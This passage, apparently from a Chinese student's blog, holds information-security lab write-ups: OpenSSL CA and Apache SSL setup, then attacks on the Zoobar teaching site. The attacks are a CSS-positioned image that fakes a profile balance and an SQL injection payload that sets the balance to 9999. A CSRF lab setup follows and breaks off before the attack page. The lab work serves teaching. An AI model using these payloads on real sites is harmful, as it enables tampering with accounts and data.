class="language-bash"></span></span><br><span class="line"><span class="language-bash">[ local_ca_policy ]</span></span><br><span class="line">commonName              = supplied</span><br><span class="line">stateOrProvinceName     = supplied</span><br><span class="line">countryName             = supplied</span><br><span class="line">emailAddress            = supplied</span><br><span class="line">organizationName        = supplied</span><br><span class="line">organizationalUnitName  = supplied</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> </span>     </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># x509 extensions to use when generating server certificates.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">[ local_ca_extensions ]</span></span><br><span class="line">subjectAltName          = DNS:localhost</span><br><span class="line">basicConstraints        = CA:false</span><br><span class="line">nsCertType              = server</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> </span>     </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># The default root certificate generation policy.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">[ req ]</span></span><br><span class="line">default_bits    = 2048</span><br><span class="line">default_keyfile = /home/username/myCA/private/cakey.pem  # 这里要将username替换为你的用户名</span><br><span class="line">default_md      = SHA256</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> </span>     </span><br><span class="line">prompt                  = no</span><br><span class="line">distinguished_name      = root_ca_distinguished_name</span><br><span class="line">x509_extensions         = root_ca_extensions</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Root Certificate Authority distinguished name.  Change these fields to match</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">your <span class="built_in">local</span> environment!</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">[ root_ca_distinguished_name ]</span></span><br><span class="line">commonName              = MyOwn Root Certificate Authority # CA机构名</span><br><span class="line">stateOrProvinceName     = JS                               # CA所在省份</span><br><span class="line">countryName             = CN                               # CA所在国家（仅限2个字符）</span><br><span class="line">emailAddress            = XXXX@XXX.com                     # 邮箱</span><br><span class="line">organizationName        = XXX                              # </span><br><span class="line">organizationalUnitName  = XXX                              # </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> </span>     </span><br><span class="line">[ root_ca_extensions ]</span><br><span class="line">basicConstraints        = CA:true</span><br></pre></td></tr></table></figure>

<p>生成CA根证书和密钥</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export OPENSSL_CONF=~/myCA/caconfig.cnf       #该命令用于给环境变量 OPENSSL_CONF 赋值为caconfig.cnf。</span><br><span class="line">openssl req -x509 -newkey rsa:2048 -out cacert.pem -outform PEM -days 1825             # 生成 CA 根证书和密钥</span><br></pre></td></tr></table></figure>

<p>该命令需要用户设置密码。不要忘记。<br>以上步骤生成了 CA 自签名根证书，和 RSA 公&#x2F;私密钥对。证书的格式是 PEM，有效期是1825天。</p>
<ul>
<li>&#x2F;myCA&#x2F;cacert.pem: CA 根证书</li>
<li>&#x2F;myCA&#x2F;private&#x2F;cakey.pem： CA 私钥</li>
</ul>
<h3 id="创建服务器公私钥"><a href="#创建服务器公私钥" class="headerlink" title="创建服务器公私钥"></a>创建服务器公私钥</h3><p>生成服务器配置文件exampleserver.cnf</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim ~/myCA/exampleserver.cnf</span><br></pre></td></tr></table></figure>

<p>exampleserver.cnf文件内容如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># exampleserver.cnf</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">[ req ]</span></span><br><span class="line">prompt             = no</span><br><span class="line">distinguished_name = server_distinguished_name</span><br><span class="line">[ server_distinguished_name ]</span><br><span class="line">commonName              = localhost          # 服务器域名</span><br><span class="line">stateOrProvinceName     = JS                 # 服务器所在省份</span><br><span class="line">countryName             = CN                 # 服务器所在国家（仅限2个字符）</span><br><span class="line">emailAddress            = XXXX@XXX.com       # 邮箱</span><br><span class="line">organizationName        = XXX                # </span><br><span class="line">organizationalUnitName  = XXX                # </span><br></pre></td></tr></table></figure>

<p>生成服务器证书和密钥</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export OPENSSL_CONF=~/myCA/exampleserver.cnf   # 该命令设置环境变量 OPENSSL_CONF，使得 openssl 更换配置文件。</span><br><span class="line">openssl req -newkey rsa:2048 -keyout tempkey.pem -keyform PEM -out tempreq.pem -outform PEM</span><br></pre></td></tr></table></figure>

<p>同样的，需要输入密码短语。<br>之后，有2种对临时秘钥的操作，选择其一即可<br>1.将临时私钥转换为 unencrypted key，即秘钥不加密状态。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl rsa -in tempkey.pem -out server_key.pem</span><br></pre></td></tr></table></figure>

<p>需要输入密码短语。</p>
<p>2.如果希望将 key 保持为加密状态，直接改名</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mv tempkey.pem server_key.pem</span><br></pre></td></tr></table></figure>

<p>两者的区别是，第二种需要在服务器启动时输入私钥的密码短语，否则会导致服务器启动失败，但第二种安全性高于第一种，可以更好的保护秘钥。</p>
<h3 id="使用CA-key对服务器证书签名"><a href="#使用CA-key对服务器证书签名" class="headerlink" title="使用CA key对服务器证书签名"></a>使用CA key对服务器证书签名</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export OPENSSL_CONF=~/myCA/caconfig.cnf</span><br><span class="line">openssl ca -in tempreq.pem -out server_crt.pem</span><br></pre></td></tr></table></figure>

<p>删除临时证书和密码文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm -f tempkey.pem &amp;&amp; rm -f tempreq.pem</span><br></pre></td></tr></table></figure>

<p>现在，自签名的服务器证书和密钥对便产生了：</p>
<ul>
<li>server_crt.pem : 服务器证书文件</li>
<li>server_key.pem : 服务器密钥文件</li>
</ul>
<h3 id="配置Apache"><a href="#配置Apache" class="headerlink" title="配置Apache"></a>配置Apache</h3><p>安装apache2</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install apache2</span><br></pre></td></tr></table></figure>



<p>建立ssl配置文件，lab-ssl.conf</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/apache2/sites-available/lab-ssl.conf</span><br></pre></td></tr></table></figure>

<p>lab-ssl.conf文件内容如下：</p>
<p>注意这里有两处username需要换成你的用户名。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;IfModule mod_ssl.c&gt;</span><br><span class="line">	&lt;VirtualHost _default_:443&gt;</span><br><span class="line">		ServerAdmin webmaster@localhost</span><br><span class="line"></span><br><span class="line">		DocumentRoot /var/www/html</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">Available loglevels: trace8, ..., trace1, debug, info, notice, warn,</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">error, crit, alert, emerg.</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">It is also possible to configure the loglevel <span class="keyword">for</span> particular</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">modules, e.g.</span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash">LogLevel info ssl:warn</span></span><br><span class="line"></span><br><span class="line">		ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span><br><span class="line">		CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">For most configuration files from conf-available/, <span class="built_in">which</span> are</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">enabled or disabled at a global level, it is possible to</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">include a line <span class="keyword">for</span> only one particular virtual host. For example the</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">following line enables the CGI configuration <span class="keyword">for</span> this host only</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">after it has been globally disabled with <span class="string">&quot;a2disconf&quot;</span>.</span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash">Include conf-available/serve-cgi-bin.conf</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  SSL Engine Switch:</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  Enable/Disable SSL <span class="keyword">for</span> this virtual host.</span></span><br><span class="line">		SSLEngine on</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  A self-signed (snakeoil) certificate can be created by installing</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  the ssl-cert package. See</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  /usr/share/doc/apache2/README.Debian.gz <span class="keyword">for</span> more info.</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  If both key and certificate are stored <span class="keyword">in</span> the same file, only the</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  SSLCertificateFile directive is needed.</span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash">SSLCertificateFile	/etc/ssl/certs/ssl-cert-snakeoil.pem</span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash">SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">网站证书和私钥地址</span></span><br><span class="line">		SSLCertificateFile    /home/username/myCA/server_crt.pem # 这里的username需要换成你的用户名</span><br><span class="line">		SSLCertificateKeyFile /home/username/myCA/server_key.pem # 这里的username需要换成你的用户名</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  Server Certificate Chain:</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  Point SSLCertificateChainFile at a file containing the</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  concatenation of PEM encoded CA certificates <span class="built_in">which</span> form the</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  certificate chain <span class="keyword">for</span> the server certificate. Alternatively</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  the referenced file can be the same as SSLCertificateFile</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  when the CA certificates are directly appended to the server</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  certificate <span class="keyword">for</span> convinience.</span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash">SSLCertificateChainFile /etc/apache2/ssl.crt/server-ca.crt</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  Certificate Authority (CA):</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  Set the CA certificate verification path <span class="built_in">where</span> to find CA</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  certificates <span class="keyword">for</span> client authentication or alternatively one</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  huge file containing all of them (file must be PEM encoded)</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  Note: Inside SSLCACertificatePath you need <span class="built_in">hash</span> symlinks</span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash">		 to point to the certificate files. Use the provided</span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash">		 Makefile to update the <span class="built_in">hash</span> symlinks after changes.</span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash">SSLCACertificatePath /etc/ssl/certs/</span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash">SSLCACertificateFile /etc/apache2/ssl.crt/ca-bundle.crt</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  Certificate Revocation Lists (CRL):</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  Set the CA revocation path <span class="built_in">where</span> to find CA CRLs <span class="keyword">for</span> client</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  authentication or alternatively one huge file containing all</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  of them (file must be PEM encoded)</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  Note: Inside SSLCARevocationPath you need <span class="built_in">hash</span> symlinks</span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash">		 to point to the certificate files. Use the provided</span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash">		 Makefile to update the <span class="built_in">hash</span> symlinks after changes.</span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash">SSLCARevocationPath /etc/apache2/ssl.crl/</span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash">SSLCARevocationFile /etc/apache2/ssl.crl/ca-bundle.crl</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  Client Authentication (Type):</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  Client certificate verification <span class="built_in">type</span> and depth.  Types are</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  none, optional, require and optional_no_ca.  Depth is a</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  number <span class="built_in">which</span> specifies how deeply to verify the certificate</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  issuer chain before deciding the certificate is not valid.</span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash">SSLVerifyClient require</span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash">SSLVerifyDepth  10</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  SSL Engine Options:</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  Set various options <span class="keyword">for</span> the SSL engine.</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  o FakeBasicAuth:</span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash">	 Translate the client X.509 into a Basic Authorisation.  This means that</span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash">	 the standard Auth/DBMAuth methods can be used <span class="keyword">for</span> access control.  The</span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash">	 user name is the `one line<span class="string">&#x27; version of the client&#x27;</span>s X.509 certificate.</span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash">	 Note that no password is obtained from the user. Every entry <span class="keyword">in</span> the user</span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash">	 file needs this password: `xxj31ZMTZzkVA<span class="string">&#x27;.</span></span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash"><span class="string">  o ExportCertData:</span></span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash"><span class="string">	 This exports two additional environment variables: SSL_CLIENT_CERT and</span></span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash"><span class="string">	 SSL_SERVER_CERT. These contain the PEM-encoded certificates of the</span></span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash"><span class="string">	 server (always existing) and the client (only existing when client</span></span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash"><span class="string">	 authentication is used). This can be used to import the certificates</span></span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash"><span class="string">	 into CGI scripts.</span></span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash"><span class="string">  o StdEnvVars:</span></span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash"><span class="string">	 This exports the standard SSL/TLS related `SSL_*&#x27;</span> environment variables.</span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash">	 Per default this exportation is switched off <span class="keyword">for</span> performance reasons,</span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash">	 because the extraction step is an expensive operation and is usually</span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash">	 useless <span class="keyword">for</span> serving static content. So one usually enables the</span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash">	 exportation <span class="keyword">for</span> CGI and SSI requests only.</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  o OptRenegotiate:</span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash">	 This enables optimized SSL connection renegotiation handling when SSL</span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash">	 directives are used <span class="keyword">in</span> per-directory context.</span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash">SSLOptions +FakeBasicAuth +ExportCertData +StrictRequire</span></span><br><span class="line">		&lt;FilesMatch &quot;\.(cgi|shtml|phtml|php)$&quot;&gt;</span><br><span class="line">				SSLOptions +StdEnvVars</span><br><span class="line">		&lt;/FilesMatch&gt;</span><br><span class="line">		&lt;Directory /usr/lib/cgi-bin&gt;</span><br><span class="line">				SSLOptions +StdEnvVars</span><br><span class="line">		&lt;/Directory&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  SSL Protocol Adjustments:</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  The safe and default but still SSL/TLS standard compliant shutdown</span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">  approach is that mod_ssl sends the close notify alert but doesn<span class="string">&#x27;t wait for</span></span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash"><span class="string">  the close notify alert from client. When you need a different shutdown</span></span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash"><span class="string">  approach you can use one of the following variables:</span></span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash"><span class="string">  o ssl-unclean-shutdown:</span></span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash"><span class="string">	 This forces an unclean shutdown when the connection is closed, i.e. no</span></span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash"><span class="string">	 SSL close notify alert is send or allowed to received.  This violates</span></span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash"><span class="string">	 the SSL/TLS standard but is needed for some brain-dead browsers. Use</span></span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash"><span class="string">	 this when you receive I/O errors because of the standard approach where</span></span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash"><span class="string">	 mod_ssl sends the close notify alert.</span></span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash"><span class="string">  o ssl-accurate-shutdown:</span></span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash"><span class="string">	 This forces an accurate shutdown when the connection is closed, i.e. a</span></span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash"><span class="string">	 SSL close notify alert is send and mod_ssl waits for the close notify</span></span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash"><span class="string">	 alert of the client. This is 100% SSL/TLS standard compliant, but in</span></span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash"><span class="string">	 practice often causes hanging connections with brain-dead browsers. Use</span></span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash"><span class="string">	 this only for browsers where you know that their SSL implementation</span></span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash"><span class="string">	 works correctly.</span></span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash"><span class="string">  Notice: Most problems of broken clients are also related to the HTTP</span></span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash"><span class="string">  keep-alive facility, so you usually additionally want to disable</span></span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash"><span class="string">  keep-alive for those clients, too. Use variable &quot;nokeepalive&quot; for this.</span></span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash"><span class="string">  Similarly, one has to force some clients to use HTTP/1.0 to workaround</span></span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash"><span class="string">  their broken HTTP/1.1 implementation. Use variables &quot;downgrade-1.0&quot; and</span></span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash"><span class="string">  &quot;force-response-1.0&quot; for this.</span></span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash"><span class="string">BrowserMatch &quot;MSIE [2-6]&quot; \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">		#		nokeepalive ssl-unclean-shutdown \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">		#		downgrade-1.0 force-response-1.0</span></span></span><br><span class="line"></span><br><span class="line">	&lt;/VirtualHost&gt;</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span></span></span><br></pre></td></tr></table></figure>

<p>启动ssl服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo a2ensite /etc/apache2/sites-available/lab-ssl.conf</span><br><span class="line">sudo a2enmod ssl</span><br></pre></td></tr></table></figure>

<p>让浏览器信任我们自建的CA</p>
<p>打开 FireFox 浏览器，依次选择“编辑”—-“首选项”—-“隐私与安全”—-“证书”—-“查看证书”—-“证书机构”，点击导入，选择 myCA 目录下的根证书“cacert.pem”, 导入。</p>
<p>在浏览器地址栏输入 <a href="https://localhost/">https://localhost</a></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211804732.png" alt="img"></p>
]]></content>
      <categories>
        <category>信息安全实践</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title>信息安全实践Lab2-CSS</title>
    <url>/2021/12/21/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5Lab2-CSS/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="信息安全实践Lab2-CSS"><a href="#信息安全实践Lab2-CSS" class="headerlink" title="信息安全实践Lab2-CSS"></a>信息安全实践Lab2-CSS</h1><h2 id="Ubuntu20-04-安装-php5-6-，php5-6-mysql，apache2，mysql5-7"><a href="#Ubuntu20-04-安装-php5-6-，php5-6-mysql，apache2，mysql5-7" class="headerlink" title="Ubuntu20.04 安装 php5.6 ，php5.6-mysql，apache2，mysql5.7"></a>Ubuntu20.04 安装 php5.6 ，php5.6-mysql，apache2，mysql5.7</h2><h3 id="安装php5-6，php5-6-mysql，apache2"><a href="#安装php5-6，php5-6-mysql，apache2" class="headerlink" title="安装php5.6，php5.6-mysql，apache2"></a>安装php5.6，php5.6-mysql，apache2</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install -y language-pack-en-base</span><br><span class="line"></span><br><span class="line">sudo LC_ALL=en_US.UTF-8 add-apt-repository ppa:ondrej/php</span><br><span class="line"></span><br><span class="line">sudo add-apt-repository ppa:ondrej/php</span><br><span class="line"></span><br><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line">sudo apt-get install php5.6</span><br><span class="line"></span><br><span class="line">sudo apt-get install php5.6-mysql</span><br><span class="line"></span><br><span class="line">sudo apt-get apache2</span><br><span class="line"></span><br><span class="line">sudo a2dismod php7.4</span><br><span class="line"></span><br><span class="line">sudo a2enmod php5.6</span><br><span class="line"></span><br><span class="line">sudo service apache2 restart</span><br></pre></td></tr></table></figure>

<h3 id="安装mysql5-7"><a href="#安装mysql5-7" class="headerlink" title="安装mysql5.7"></a>安装mysql5.7</h3><p><a href="https://blog.csdn.net/Deadly_97/article/details/111675825">https://blog.csdn.net/Deadly_97/article/details/111675825</a></p>
<h2 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h2><h2 id="问题2-Zoobar网站寻找漏洞"><a href="#问题2-Zoobar网站寻找漏洞" class="headerlink" title="问题2:Zoobar网站寻找漏洞"></a>问题2:Zoobar网站寻找漏洞</h2><p>Manage your profile in the zoobar website, make your zoobars appear more than you really own. That is, after you modify your profile, when others or yourself look up your profile, they will see more zoobars than you actually own.</p>
<h3 id="方法一：利用css"><a href="#方法一：利用css" class="headerlink" title="方法一：利用css"></a>方法一：利用css</h3><ol>
<li><p>在a用户的profile中输入</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=&quot;http://<span class="number">106.13</span>.<span class="number">136.87</span>:<span class="number">8080</span>/<span class="number">100</span>.png<span class="string">&quot; style=&quot;</span>position:relative;<span class="attribute">top</span>:-<span class="number">55px</span>;<span class="attribute">right</span>:-<span class="number">63px</span>;<span class="attribute">width</span>:<span class="number">34px</span>;<span class="attribute">height</span>:<span class="number">21px</span><span class="string">&quot;/&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>然后b用户在User中输入用户名a，就会看到a有100个zoobars，其实a并没有100个</p>
</li>
</ol>
<h2 id="方法二：sql注入"><a href="#方法二：sql注入" class="headerlink" title="方法二：sql注入"></a>方法二：sql注入</h2><ol>
<li><p>源码中，处理$profile参数sql语句如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;UPDATE Person SET Profile=&#x27;$profile&#x27; &quot;.</span><br><span class="line">           &quot;WHERE PersonID=$user-&gt;id&quot;;</span><br></pre></td></tr></table></figure>
</li>
<li><p>假设第一个用户a在profile中输入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;,Zoobars=9999,Profile=&#x27;</span>Welcome <span class="keyword">to</span> my profile<span class="operator">!</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>最后执行的sql如下</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> Person <span class="keyword">set</span> Profile<span class="operator">=</span><span class="string">&#x27;&#x27;</span>,Zoobars<span class="operator">=</span><span class="number">9999</span>,Profile<span class="operator">=</span><span class="string">&#x27;Welcome to my profile!&#x27;</span> <span class="keyword">where</span> PeronID<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>最后再去查a的余额就有9999个zoobars</p>
</li>
</ol>
]]></content>
      <categories>
        <category>信息安全实践</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title>信息安全实践Lab3-CSRF&amp;XSS&amp;Click Jacking</title>
    <url>/2021/12/21/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5Lab3-CSRF&amp;XSS&amp;%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="信息安全实践Lab3-CSRF-amp-XSS-amp-Click-Jacking"><a href="#信息安全实践Lab3-CSRF-amp-XSS-amp-Click-Jacking" class="headerlink" title="信息安全实践Lab3-CSRF&amp;XSS&amp;Click Jacking"></a>信息安全实践Lab3-CSRF&amp;XSS&amp;Click Jacking</h1><p>该实验可以在一台虚拟机上完成，本文采用两台虚拟机的方式，myzoo网站所在虚拟机ip：10.211.55.14 , 攻击者网站所在虚拟机ip：10.211.55.16 。</p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>在zoobar网站上展示并防御CSRF攻击。请注意在防御时的粒度问题，防止所有人的token都一样；以及刷新太快，正常操作都失败。</p>
<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>先在myzoo网站注册两个账号 victim和csrfattack。</p>
<p>攻击者服务器所在虚拟机配置(10.211.55.16)：</p>
<p>1.安装apache2</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install apache2</span><br></pre></td></tr></table></figure>

<p>2.关闭防火墙</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ufw disable</span><br></pre></td></tr></table></figure>

<p>3.配置hosts</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br><span class="line">在最后添加 </span><br><span class="line">10.211.55.14  www.myzoo.com  #这里的ip填写myzoo服务器的ip地址</span><br><span class="line">127.0.0.1 www.attack.com </span><br></pre></td></tr></table></figure>

<p>4.编写index.html文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo cd /var/www/html</span><br><span class="line">sudo vim index.html</span><br><span class="line">将下面的内容复制进去即可</span><br></pre></td></tr></table></figure>

<p><strong>index.html</strong></p>
